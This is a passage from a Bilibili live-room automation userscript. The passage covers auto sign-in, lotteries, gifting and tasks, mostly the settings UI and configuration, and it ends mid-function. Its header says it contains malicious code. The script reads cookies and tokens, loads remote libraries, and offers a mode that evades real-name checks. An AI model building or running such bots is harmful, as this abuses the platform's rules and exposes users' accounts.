// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.6.4
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH@master/BilibiliAPI_Plus.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH@master/OCRAD.min.js
// @require      https://cdn.jsdelivr.net/gh/lzghzr/TampermonkeyJS@master/libBilibiliToken/libBilibiliToken.user.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
如果 jsdelivr 不可用时，推荐换Host 并调整为以下支持库源
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/BilibiliAPI_Plus.js
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/OCRAD.min.js
// @require      https://raw.githubusercontent.com/lzghzr/TampermonkeyJS/master/libBilibiliToken/libBilibiliToken.user.js
*/
/*
如果 raw.githubusercontent.com 无法访问 请自行尝试修改 Hosts 后 再尝试访问
151.101.76.133 raw.githubusercontent.com
*/
(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.6.4';
    try {
	var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
	const t = Date.now() / 1000;
	if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
	    console.error('魔改脚本重复运行')
	    return;
	}
    } catch (e) {}
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
	if (!DEBUGMODE) return;
	let d = new Date();
	d =
	    `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
	if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
	else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
	short_id: undefined,
	roomid: undefined,
	uid: undefined,
	ruid: undefined,
	rnd: undefined,
	csrf_token: undefined,
	visit_id: undefined,
	silver: undefined,
	gold: undefined,
	mobile_verify: undefined,
	identification: undefined,
	gift_list: undefined,
	gift_list_str: '礼物对照表',
	blocked: false,
	awardBlocked: false,
	appToken: undefined
    };
    const getAccessToken = async () => {
	if (Token && TokenUtil) {
	    const userToken = await Token.getToken();
	    if (userToken === undefined) {
		console.error('未获取到移动端token,部分功能可能失效');
	    }
	    return userToken;
	}
	return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
	let arr;
	const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
	if ((arr = document.cookie.match(reg))) {
	    return unescape(arr[2]);
	} else {
	    return null;
	}
    };

    const delayCall = (callback, delay = 10e3) => {
	const p = $.Deferred();
	setTimeout(() => {
	    const t = callback();
	    if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3,
										      arg4, arg5, arg6));
	    else p.resolve();
	}, delay);
	return p;
    };

    const checkNewDay = (ts) => {
	// 检查是否为新的一天，以UTC+8为准
	const t = new Date(ts);
	t.setMinutes(t.getMinutes() + tz_offset);
	t.setHours(0, 0, 0, 0);
	const d = new Date();
	d.setMinutes(t.getMinutes() + tz_offset);
	return (d - t > 86400e3);
    };

    const runTomorrow = (callback,hours = 0) => {
	const t = new Date();
	t.setMinutes(t.getMinutes() + tz_offset);
	t.setDate(t.getDate() + 1);
	t.setHours(hours, 1, 0, 0);
	t.setMinutes(t.getMinutes() - tz_offset);
	setTimeout(callback, t - ts_ms());
	DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
	const runUntilSucceed = (callback, delay = 0, period = 100) => {
	    setTimeout(() => {
		if (!callback()) runUntilSucceed(callback, period, period);
	    }, delay);
	};

	const addCSS = (context) => {
	    const style = document.createElement('style');
	    style.type = 'text/css';
	    style.innerHTML = context;
	    document.getElementsByTagName('head')[0].appendChild(style);
	};

	const Essential = {
	    init: () => {
		return Essential.Toast.init().then(() => {
		    return Essential.AlertDialog.init().then(() => {
			return Essential.Config.init().then(() => {
			    Essential.DataSync.init();
			    Essential.Cache.load();
			    Essential.Config.load();
			});
		    });
		});
	    },
	    Toast: {
		init: () => {
		    try {
			const toastList = [];
			window.toast = (msg, type = 'info', timeout = 3e3) => {
			    let d = new Date().toLocaleTimeString();
			    switch (type) {
				case 'success':
				case 'info':
				    console.info(`[${NAME}][${d}]${msg}`);
				    break;
				case 'caution':
				    console.warn(`[${NAME}][${d}]${msg}`);
				    break;
				case 'error':
				    console.error(`[${NAME}][${d}]${msg}`);
				    break;
				default:
				    type = 'info';
				    console.log(`[${NAME}][${d}]${msg}`);
			    }
			    if (CONFIG && !CONFIG.SHOW_TOAST) return;
			    const a = $(
				`<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`
			    )[0];
			    document.body.appendChild(a);
			    a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
			    a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth -
					    5) + 'px';
			    toastList.push(a);
			    setTimeout(() => {
				a.className += ' out';
				setTimeout(() => {
				    toastList.shift();
				    toastList.forEach((v) => {
					v.style.top = (parseInt(v.style.top, 10) -
						       40) + 'px';
				    });
				    $(a).remove();
				}, 200);
			    }, timeout);
			};
			return $.Deferred().resolve();
		    } catch (err) {
			console.error(`[${NAME}]初始化浮动提示时出现异常`);
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    }, // Need Init
	    AlertDialog: {
		init: () => {
		    try {
			const div_background = $(`<div id="${NAME}_alertdialog"/>`);
			div_background[0].style =
			    'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
			const div_position = $('<div/>');
			div_position[0].style = 'display: table-cell;vertical-align: middle;';
			const div_style = $('<div/>');
			div_style[0].style =
			    'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
			div_position.append(div_style);
			div_background.append(div_position);

			const div_title = $('<div/>');
			div_title[0].style = 'position: relative;padding-bottom: 12px;';
			const div_title_span = $('<span>提示</span>');
			div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
			div_title.append(div_title_span);
			div_style.append(div_title);

			const div_content = $('<div/>');
			div_content[0].style =
			    'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
			div_style.append(div_content);

			const div_button = $('<div/>');
			div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
			div_style.append(div_button);

			const button_ok = $('<button><span>确定</span></button>');
			button_ok[0].style =
			    'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
			div_button.append(button_ok);

			window.alertdialog = (title, content) => {
			    div_title_span.html(title);
			    div_content.html(content);
			    button_ok.click(() => {
				$(`#${NAME}_alertdialog`).remove();
			    });
			    $('body > .link-popup-ctnr').first().append(div_background);
			};
			return $.Deferred().resolve();
		    } catch (err) {
			window.toast('初始化帮助界面时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    }, // Need Init After Toast.init
	    Config: {
		CONFIG_DEFAULT: {
		    DD_BP: true,
		    DD_BP_CONFIG:{
			BP_KEY: "",
			DM_STORM: true,
		    },
		    AUTO_SIGN: true,
		    AUTO_TREASUREBOX: false,
		    AUTO_GROUP_SIGN: true,
		    MOBILE_HEARTBEAT: false,
		    AUTO_LOTTERY: true,
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: "",
			RANK_TOP:false,
			GIFT_LOTTERY: true,
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: 0
			},
			GUARD_AWARD: true,
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: 1,
			    CHANGE_ROOM_INTERVAL: 60
			},
			PK_AWARD: true,
			MATERIAL_OBJECT_LOTTERY: true,
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: 10,
			    IGNORE_QUESTIONABLE_LOTTERY: true
			},
			STORM: false,
			STORM_CONFIG: {
			    NO_REAL_CHECK: false,
			    STORM_MAX_TIME: 20,
			    STORM_ONE_LIMIT: 120,
			},
			HIDE_POPUP: true
		    },
		    AUTO_TASK: true,
		    AUTO_GIFT: false,
		    AUTO_GIFT_CONFIG: {
			ROOMID: [0],
			EXCLUDE_ROOMID: [0],
			GIFT_INTERVAL: 10,
			GIFT_LIMIT: 86400,
			GIFT_SORT: true,
			AUTO_LIGHT: true,
			AUTO_LIGHT_LIMIT_LEVEL:10,
			SEND_ALL: false
		    },
		    SILVER2COIN: false,
		    AUTO_DAILYREWARD: true,
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: true,
			WATCH: true,
			COIN: false,
			COIN_CONFIG: {
			    NUMBER: 5
			},
			SHARE: true
		    },
		    SHOW_TOAST: true
		},
		NAME: {
		    DD_BP: 'BiliPush推送',
		    DD_BP_CONFIG:{
			BP_KEY: 'Key',
			DM_STORM: 'DD弹幕风暴',
		    },
		    AUTO_SIGN: '自动签到',
		    AUTO_TREASUREBOX: '自动领取银瓜子',
		    AUTO_GROUP_SIGN: '自动应援团签到',
		    MOBILE_HEARTBEAT: '移动端心跳',
		    AUTO_LOTTERY: '自动抽奖',
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '休眠时间',
			RANK_TOP: '小时榜',
			GIFT_LOTTERY: '礼物抽奖',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '刷新间隔'
			},
			GUARD_AWARD: '舰队领奖',
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '监听倍数',
			    CHANGE_ROOM_INTERVAL: '换房间隔'
			},
			PK_AWARD: '乱斗领奖',
			MATERIAL_OBJECT_LOTTERY: '实物抽奖',
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '检查间隔',
			    IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
			},
			STORM: '节奏风暴',
			STORM_CONFIG: {
			    NO_REAL_CHECK: '非实名模式*',
			    STORM_MAX_TIME: '最大持续时间',
			    STORM_ONE_LIMIT: '尝试间隔',
			},
			HIDE_POPUP: '隐藏抽奖提示框'
		    },
		    AUTO_TASK: '自动完成任务',
		    AUTO_GIFT: '自动送礼物',
		    AUTO_GIFT_CONFIG: {
			ROOMID: '优先房间号',
			EXCLUDE_ROOMID: '排除房间号',
			GIFT_INTERVAL: '检查间隔(分钟)',
			GIFT_SORT: '优先高等级',
			GIFT_LIMIT: '到期时间(秒)',
			AUTO_LIGHT: '自动点亮勋章',
			AUTO_LIGHT_LIMIT_LEVEL: '点亮最低等级线',
			SEND_ALL: '送满全部勋章'
		    },
		    SILVER2COIN: '银瓜子换硬币',
		    AUTO_DAILYREWARD: '自动每日奖励',
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: '登录',
			WATCH: '观看',
			COIN: '投币',
			COIN_CONFIG: {
			    NUMBER: '数量'
			},
			SHARE: '分享'
		    },
		    SHOW_TOAST: '显示浮动提示'
		},
		PLACEHOLDER: {
		    DD_BP_CONFIG:{
			BP_KEY: 'key',
		    },
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '时间范围03:00-08:00',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '单位(分钟)'
			},
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '1~5，默认1',
			    CHANGE_ROOM_INTERVAL: '单位(分钟)'
			},
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '单位(分钟)'
			},
			STORM_CONFIG: {
			    STORM_MAX_TIME: '单位(秒)',
			    STORM_ONE_LIMIT: '单位（毫秒）',
			},
		    },
		    AUTO_GIFT_CONFIG: {
			ROOMID: '为0不送礼',
			GIFT_DEFAULT: '为空默认不送',
			GIFT_ALLOWED: '为空允许所有'
		    }
		},
		HELP: {
		    DD_BP: '魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
		    DD_BP_CONFIG:{
			DM_STORM: 'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
		    },
		    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
		    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
			RANK_TOP:'自动扫描小时榜',
			GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
			},
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
			    CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
			},
			MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
			    IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
			},
			STORM: '尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
			STORM_CONFIG: {
			    NO_REAL_CHECK:'使用移动端模式去抢风暴，不用实名（但是可能造成用户大会员异常冻结，自行取舍）',
			    STORM_MAX_TIME: '单个风暴最大尝试时间（不推荐超过90）',
			    STORM_ONE_LIMIT: '单个风暴参与次数间隔（毫秒）',
			},
			HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
		    },
		    AUTO_GIFT_CONFIG: {
			ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
			EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
			GIFT_INTERVAL: '检查间隔(分钟)',
			GIFT_SORT: '打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
			GIFT_LIMIT: '到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
			GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
			GIFT_ALLOWED: () => (
			    `设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`
			),
			SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
			AUTO_LIGHT: '自动用小心心点亮亲密度未满且未被排除的灰掉的勋章',
			AUTO_LIGHT_LIMIT_LEVEL: '自动点亮等级>=设定值的勋章，低于等级的不自动点亮'
		    },
		    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
		    AUTO_DAILYREWARD: '自动完成每日经验的任务',
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
			WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
			COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
			SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
		    },
		    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
		},
		showed: false,
		init: () => {
		    try {
			const p = $.Deferred();
			const getConst = (itemname, obj) => {
			    if (itemname.indexOf('-') > -1) {
				const objname = itemname.match(/(.+?)-/)[1];
				if (objname && obj[objname]) return getConst(itemname.replace(
				    `${objname}-`, ''), obj[objname]);
				else return undefined;
			    }
			    if (typeof obj[itemname] === 'function') return obj[itemname]();
			    return obj[itemname];
			};
			const recur = (cfg, element, parentname = undefined) => {
			    for (const item in cfg) {
				let itemname;
				if (parentname) itemname = `${parentname}-${item}`;
				else itemname = item;
				const id = `${NAME}_config_${itemname}`;
				const name = getConst(itemname, Essential.Config.NAME);
				const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
				let e;
				let h;
				if (getConst(itemname, Essential.Config.HELP)) h = $(
				    `<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`
				);
				switch ($.type(cfg[item])) {
				    case 'number':
				    case 'string':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
					if (h) e.append(h);
					element.append(e);
					break;
				    case 'boolean':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`
					);
					if (h) e.append(h);
					element.append(e);
					if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(
					    `#${id}`).addClass(`${NAME}_control`);
					break;
				    case 'array':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
					if (h) e.append(h);
					element.append(e);
					break;
				    case 'object':
					e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
					element.append(e);
					recur(cfg[item], e, itemname);
					break;
				}
			    }
			};
			runUntilSucceed(() => {
			    try {
				let findSp = false;
				let blancFrames = $('iframe');
				if (blancFrames && blancFrames.length > 0) {
				    blancFrames.each((k, v) => {
					if (v.src.includes('/blanc/')) {
					    findSp = true;
					    window.toast('检查到特殊活动页，尝试跳转...', 'info', 5e3);
					    setTimeout(() => {
						location.replace(v.src);
					    }, 10);
					    return false;
					}
				    });
				}
				if (findSp) {
				    p.reject();
				    return true;
				}
				//if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
				if (!$('#sidebar-vm')[0]) return false;
				// 加载css
				addCSS(
				    `.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`
				);
				// 绘制右下角按钮
				const div_button_span = $('<span>魔改助手设置</span>');
				div_button_span[0].style =
				    'font-size: 12px;line-height: 16px;color: #0080c6;';
				const div_button = $('<div/>');
				div_button[0].style =
				    'cursor: pointer;text-align: center;padding: 0px;';
				const div_side_bar = $('<div/>');
				div_side_bar[0].style =
				    'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
				div_button.append(div_button_span);
				div_side_bar.append(div_button);
				//$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
				$('#sidebar-vm').after(div_side_bar);
				// 绘制设置界面
				const div_position = $('<div/>');
				div_position[0].style =
				    'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
				const div_style = $('<div/>');
				div_style[0].style =
				    'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
				div_position.append(div_style);
				document.body.appendChild(div_position[0]);
				// 绘制标题栏及按钮
				const div_title = $('<div/>');
				div_title[0].style =
				    'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
				const div_title_span = $(
				    '<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>'
				);
				const div_title_button = $('<div/>');
				div_title_button[0].style =
				    'float: right;display: inline;padding-right: 8px;';
				const div_button_line = $(`<div style="display: inline;"></div>`);
				const span_button_state = $(
				    `<span class="${NAME}_clickable">统计</span>`)
				div_button_line.append(span_button_state);
				div_button_line.append("  ");
				const span_button_clear = $(
				    `<span class="${NAME}_clickable">清除缓存</span>`)
				div_button_line.append(span_button_clear);
				div_title_button.append(div_button_line);
				div_title.append(div_title_span);
				div_title.append(div_title_button);
				div_style.append(div_title);
				// 绘制设置项内容
				const div_context_position = $('<div/>');
				div_context_position[0].style =
				    'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
				const div_context = $('<div/>');
				div_context[0].style =
				    'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
				div_context_position.append(div_context);
				div_style.append(div_context_position);
				recur(Essential.Config.CONFIG_DEFAULT, div_context);
				// 设置事件
				div_button.click(() => {
				    if (!Essential.Config.showed) {
					Essential.Config.load();
					div_position.css('right', div_side_bar[0].clientWidth +
							 'px');
					div_position.show();
					div_button_span.text('点击保存设置');
					div_button_span.css('color', '#ff8e29');
				    } else {
					Essential.Config.save();
					div_position.hide();
					div_button_span.text('魔改助手设置');
					div_button_span.css('color', '#0080c6');
					BiliPushUtils.Check.sleepTimeRangeBuild();
					if (CONFIG.DD_BP) {
					    BiliPush.connectWebsocket(true);
					} else if (BiliPush.gsocket) {
					    BiliPush.gsocket.close();
					}
				    }
				    Essential.Config.showed = !Essential.Config.showed;
				});
				span_button_clear.click(() => {
				    Essential.Cache.clear();
				    location.reload();
				});
				span_button_state.click(() => {
				    Statistics.showDayGifts();
				});
				const getItemByElement = (element) => element.id.replace(
				    `${NAME}_config_`, '');
				const getItemByHelpElement = (element) => element.id.replace(
				    `${NAME}_config_`, '').replace('_help', '');
				$(`.${NAME}_help`).click(function () {
				    window.alertdialog('说明', getConst(getItemByHelpElement(
					this), Essential.Config.HELP));
				});
				$(`.${NAME}_control`).click(function () {
				    if ($(this).is(':checked')) {
					$(
					    `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).show();
				    } else {
					$(
					    `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).hide();
				    }
				});
				p.resolve();
				return true;
			    } catch (err) {
				window.toast('初始化设置界面时出现异常', 'error');
				console.error(`[${NAME}]`, err);
				p.reject();
				return true;
			    }
			});
			return p;
		    } catch (err) {
			window.toast('初始化设置时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		},
		recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
		    for (const item in cfg_default) {
			let itemname;
			if (parentname) itemname = `${parentname}-${item}`;
			else itemname = item;
			const e = $(`#${NAME}_config_${itemname}`);
			if (!e[0]) continue;
			if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
			switch ($.type(cfg[item])) {
			    case 'number':
			    case 'string':
				e.val(cfg[item]);
				break;
			    case 'boolean':
				e.prop('checked', cfg[item]);
				if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
				else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
				break;
			    case 'array':
				e.val(cfg[item].join(','));
				break;
			    case 'object':
				Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
				break;
			}
		    }
		},
		recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
		    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
		    for (const item in cfg_default) {
			let itemname;
			if (parentname) itemname = `${parentname}-${item}`;
			else itemname = item;
			const e = $(`#${NAME}_config_${itemname}`);
			if (!e[0]) continue;
			switch ($.type(cfg[item])) {
			    case 'string':
				cfg[item] = e.val() || '';
				break;
			    case 'number':
				cfg[item] = parseFloat(e.val());
				if (isNaN(cfg[item])) cfg[item] = 0;
				break;
			    case 'boolean':
				cfg[item] = e.is(':checked');
				break;
			    case 'array':
				var value = e.val().replace(/(\s|\u00A0)+/, '');
				if (value === '') {
				    cfg[item] = [];
				} else {
				    cfg[item] = value.split(',');
				    cfg[item].forEach((v, i) => {
					cfg[item][i] = parseFloat(v);
					if (isNaN(cfg[item][i])) cfg[item][i] = 0;
				    });
				}
				break;
			    case 'object':
				cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[
				    item]);
				break;
			}
			if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
		    }
		    return cfg;
		},
		fix: (config) => {
		    // 修正设置项中不合法的参数，针对有输入框的设置项
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER;
		    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG
											   .GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
		    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

		    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined)
			config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT
			    .AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
											       .GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
			.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined)
			config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config
			    .CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
												  .GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
